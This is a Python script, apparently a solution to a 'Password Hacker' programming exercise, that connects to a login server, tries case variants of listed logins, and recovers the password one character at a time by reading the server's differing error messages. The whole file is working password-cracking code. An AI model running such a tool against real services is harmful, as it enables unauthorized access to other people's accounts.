import socket
import sys
import string
import json
from itertools import product

ip_address = sys.argv[1]
port = sys.argv[2]
letters_digits = string.ascii_letters + string.digits


def create_generator(input_lst: list[str]) -> list[str]:
    for login in input_lst:
        message_generator = list(map(lambda x: ''.join(x),
                                     product(*([letter.lower(), letter.upper()] for letter in login))))
        return message_generator


class Socket:
    def __init__(self):
        self.sock = socket.socket()

    def connect(self, host, port):
        self.sock.connect((host, port))

    def send(self, message):
        self.sock.send(message.encode())

    def receive(self):
        return self.sock.recv(1024)

    def check_login(self):
        with open('C:\\Python\\HyperSkill\\Password Hacker (Python)\\Password Hacker (Python)\\task\\hacking\\logins.txt', 'r') as file:
            logins = file.read().splitlines()
            for login in logins:
                message_generator = list(map(lambda x: ''.join(x),
                    product(*([letter.lower(), letter.upper()] for letter in login))))

                for message in message_generator:
                    message_to_json = json.dumps({"login": ''.join(message), "password": ' '})
                    self.sock.send(message_to_json.encode())
                    message_from_json = json.loads(self.receive().decode('utf-8'))
                    if message_from_json["result"] == "Wrong password!":
                        return ''.join(message)

    def check_password(self):
        password_guess = ''
        login = self.check_login()
        generator = (letter for letter in letters_digits)
        while True:
            letter = next(generator)
            password_guess += letter
            message_to_json = json.dumps({"login": login, "password": password_guess})
            self.sock.send(message_to_json.encode())
            message_from_json = json.loads(self.receive().decode('utf-8'))
            if message_from_json["result"] == "Exception happened during login":
                generator = iter(letters_digits)
            elif message_from_json["result"] == "Wrong password!":
                password_guess = password_guess[:-1]
            elif message_from_json["result"] == "Connection success!":
                return message_to_json

    def close_conn(self):
        self.sock.close()


def main():
    sock = Socket()
    sock.connect(ip_address, int(port))
    print(sock.check_password())
    sock.close_conn()


if __name__ == '__main__':
    main()
